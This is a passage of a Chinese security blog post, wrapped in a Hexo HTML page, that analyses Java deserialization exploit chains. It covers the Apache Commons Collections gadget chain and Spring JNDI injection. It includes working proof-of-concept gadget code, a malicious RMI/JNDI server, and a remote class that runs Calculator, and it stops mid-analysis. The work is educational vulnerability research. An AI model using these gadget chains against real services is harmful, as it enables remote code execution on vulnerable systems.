@@ -1,0 +1,813 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="首发于安全客https://www.anquanke.com/post/id/173459 最近学习了一下java的反序列化漏洞，对一些之前爆出来的一些开源组件的反序列化漏洞的进行了简单的分析，并总结到这篇文章中。  项目的依赖项配置为了复现时安装各个版本的库方便我使用了maven来构建项目。我是用的maven依赖项的配置为： 1234567891011121314151617181920212">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化漏洞的一些利用链分析">
+<meta property="og:url" content="http://yoursite.com/Web/java-deserialize/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="首发于安全客https://www.anquanke.com/post/id/173459 最近学习了一下java的反序列化漏洞，对一些之前爆出来的一些开源组件的反序列化漏洞的进行了简单的分析，并总结到这篇文章中。  项目的依赖项配置为了复现时安装各个版本的库方便我使用了maven来构建项目。我是用的maven依赖项的配置为： 1234567891011121314151617181920212">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hexo.imagemlt.xyz/post/apache-common-collections/F0D6679D-9008-4677-84C4-0B76725033AF.png">
+<meta property="og:image" content="http://hexo.imagemlt.xyz/post/apache-common-collections/image-20190206104745142.png">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1g0609qk6oij30ja06u0tv.jpg">
+<meta property="og:updated_time" content="2019-03-20T17:15:30.056Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="java反序列化漏洞的一些利用链分析">
+<meta name="twitter:description" content="首发于安全客https://www.anquanke.com/post/id/173459 最近学习了一下java的反序列化漏洞，对一些之前爆出来的一些开源组件的反序列化漏洞的进行了简单的分析，并总结到这篇文章中。  项目的依赖项配置为了复现时安装各个版本的库方便我使用了maven来构建项目。我是用的maven依赖项的配置为： 1234567891011121314151617181920212">
+<meta name="twitter:image" content="http://hexo.imagemlt.xyz/post/apache-common-collections/F0D6679D-9008-4677-84C4-0B76725033AF.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/Web/java-deserialize/">
+
+  <title> java反序列化漏洞的一些利用链分析 | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Web/" rel="tag" title="Web">Web</a>
+      
+      </div>
+      <h1>java反序列化漏洞的一些利用链分析</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2019-03-21T01:09:10+08:00" content="2019-03-21" title="2019-03-21 01:09:10">
+          2019-03-21
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                java反序列化漏洞的一些利用链分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2019-03-21T01:09:10+08:00" content="2019-03-21">
+              2019-03-21
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>首发于安全客<a href="https://www.anquanke.com/post/id/173459" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173459</a></p>
+<p>最近学习了一下java的反序列化漏洞，对一些之前爆出来的一些开源组件的反序列化漏洞的进行了简单的分析，并总结到这篇文章中。</p>
+</blockquote>
+<h2 id="项目的依赖项配置"><a href="#项目的依赖项配置" class="headerlink" title="项目的依赖项配置"></a>项目的依赖项配置</h2><p>为了复现时安装各个版本的库方便我使用了maven来构建项目。我是用的maven依赖项的配置为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Apache-common-collections"><a href="#Apache-common-collections" class="headerlink" title="Apache common collections"></a>Apache common collections</h2><p>Apache common collections的反序列化利用链在15年左右爆出，由于许多框架都用到了这个库，因此也是造成了很大的影响。</p>
+<h3 id="Pop链"><a href="#Pop链" class="headerlink" title="Pop链"></a>Pop链</h3><p>apache common collection的整个反序列化过程主要依托于transformer类以及TransformedMap类。Transformer类用于描述变换过程，而TransformedMap则将这个变换过程应用于一个Map上，当Map中的元素发生改变时则按照设置好的Transformer进行一系列的处理操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap=TransformedMap.decorate(map,keyTrasnfomer,valueTransformer);</span><br></pre></td></tr></table></figure>
+<p>这里便是通过一个decorate函数将一个map转换为TransformedMap,并且对map的key和value绑定相应的这里便通过一个decorate函数将一个map转换为TranformedMap,并对map的key和value绑定相应的Transformer,当<code>key</code>和<code>value</code>改变时便触发对应的<code>Transformer</code>的<code>transform</code>方法进行处理动作。</p>
+<p>如果想要实现一连串的变换操作则可以通过ChainedTransformer来实现,比如这里我们用于实现RCE的Tranformer链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                由于Method类的invoke(Object obj,Object args[])方法的定义</span></span><br><span class="line"><span class="comment">                所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">                正常POC流程举例：</span></span><br><span class="line"><span class="comment">                ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span> &#125; <span class="comment">//目标机器上反序列化后执行的命令</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">Transformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+<p>实际执行的代码便是<code>((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</code>,也就是Map下的弹计算器的指令。</p>
+<p>之后我们可以构造一个使用这个chain的TransformedMap,并且触发对这个transformedMap的处理即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"a"</span>,<span class="string">"b"</span>);</span><br><span class="line">Map transformedMap=TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line">transformedMap.put(<span class="string">"a"</span>,<span class="string">"z"</span>);</span><br></pre></td></tr></table></figure>
+<p>执行后即可发现能够成功弹出计算器</p>
+<p><img src="http://hexo.imagemlt.xyz/post/apache-common-collections/F0D6679D-9008-4677-84C4-0B76725033AF.png" alt="F0D6679D-9008-4677-84C4-0B76725033AF"></p>
+<h3 id="RCE构造"><a href="#RCE构造" class="headerlink" title="RCE构造"></a>RCE构造</h3><p>我们已经构造出了执行命令的popChain,那样怎样才能找到一个符合条件的RCE?我们需要找到一个满足下列条件的类:</p>
+<ul>
+<li>重写了<code>readObject</code>方法</li>
+<li>在readObject方法中存在对一个可控的map进行修改的过程</li>
+</ul>
+<p>之前的很多文章都是使用的<code>AnnotationInvocationHandler</code>类,然而最开始调试时我使用的jdk版本(1.8)中该类的<code>readObject</code>方法中并没有找到对map的更改操作。后来参考反序列化自动化工具<code>ysoserial</code>中的<code>CommonsCollections5</code>这个payload实现了其中的一个调用链：利用<code>BadAttributeValueExpException</code>类。我们可以看一下这个类的readObject方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里我们对反序列化传入的对象的成员属性val判断其类型，如果这个变量不是String便会调用val的toString方法。这里如果我们通过反序列化传入的val是一个lazyMap类的entry，在调用其toString方法时便会调用LazyMap.get()从而触发绑定的Transformer的<code>transform</code>方法。但是这里我们的<code>LazyMap</code>类在获取一个不存在的键的时候才会触发<code>transform</code>，因此我们这里可以引入另外一个类<code>TiedMapEntry</code>,这个类在执行toString时可以调用其绑定的map取获取预定的键。</p>
+<p>因此这个poc链的执行过程为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAtrributeValueException对象exception  -&gt;</span><br><span class="line">exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 -&gt;</span><br><span class="line">调用entry的toString() -&gt;</span><br><span class="line">调用lazyMap的get方法获取这个不存在的键 -&gt;</span><br><span class="line">调用transform方法</span><br></pre></td></tr></table></figure>
+<p>具体实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map normalMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">normalMap.put(<span class="string">"hackedby"</span>,<span class="string">"imagemlt"</span>);</span><br><span class="line">Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException exception=<span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valField=exception.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valField.set(exception,entry);</span><br><span class="line"></span><br><span class="line">File f=<span class="keyword">new</span> File(<span class="string">"/tmp/payload.bin"</span>);</span><br><span class="line">ObjectOutputStream out=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">out.writeObject(exception);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">ObjectInputStream in=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(f));</span><br><span class="line">in.readObject();</span><br></pre></td></tr></table></figure>
+<p><img src="http://hexo.imagemlt.xyz/post/apache-common-collections/image-20190206104745142.png" alt="image-20190206104745142"></p>
+<p>其实我们看这个反序列化的利用链可以联想到之前wordpress的phar 反序列化RCE的漏洞也用到了一个类似的对数组进行操作的Iterator类，所以利用一个Map的附加操作也可以作为我们挖掘此类漏洞的思路。</p>
+<h2 id="Spring-JNDI反序列化漏洞"><a href="#Spring-JNDI反序列化漏洞" class="headerlink" title="Spring JNDI反序列化漏洞"></a>Spring JNDI反序列化漏洞</h2><p>众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的<code>org.springframeworkl.transation.jta.JtaTransationManager</code>类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。</p>
+<blockquote>
+<p>这里的测试环境使用的是github上的项目<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
+</blockquote>
+<h3 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h3><p>在这里的JNDI的利用方法在下面分析fastjson的反序列化漏洞时也会用到。<code>JNDI</code>(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。在这里我们给出在java下的一段提供JNDI服务的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8086</span>), <span class="number">0</span>);</span><br><span class="line">httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">httpServer.start();</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.01:8086/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对<code>ExportObject</code>类的查询，这里ExportObject类的源码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其功能便是执行我们验证rce时常用的调用计算器的功能。</p>
+<p>要加载ExportObject类我们可以使用以下的代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"rmi://127.0.0.1:1099/Object"</span>);</span><br><span class="line"><span class="comment">//System.out.println("loaded obj");</span></span><br></pre></td></tr></table></figure>
+<p>执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。</p>
+<h3 id="Spring框架中的JNDI反序列化漏洞"><a href="#Spring框架中的JNDI反序列化漏洞" class="headerlink" title="Spring框架中的JNDI反序列化漏洞"></a>Spring框架中的JNDI反序列化漏洞</h3><p>导致JNDI反序列化问题的类主要是<code>org.springframework.transaction.jta.JtaTransactionManager</code>类。跟进该类的源码中的<code>readObject()</code>函数:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line">        <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</span><br><span class="line">        <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>initUserTransactionAndTransactionManager()</code>函数</p>
